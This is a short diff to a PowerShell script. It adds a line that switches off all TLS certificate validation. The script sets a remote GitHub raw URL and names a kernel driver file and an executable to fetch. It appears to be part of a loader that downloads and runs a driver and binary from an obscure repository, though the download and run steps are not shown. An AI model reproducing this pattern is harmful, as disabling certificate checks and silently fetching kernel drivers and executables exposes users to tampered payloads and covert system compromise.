@@ -1,3 +1,4 @@
+[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 $BaseUrl = "https://github.com/70r3n7/fk38du56/raw/refs/heads/main"
 $DriverName = "metadata.sys"
 $DataName = "Data.exe"
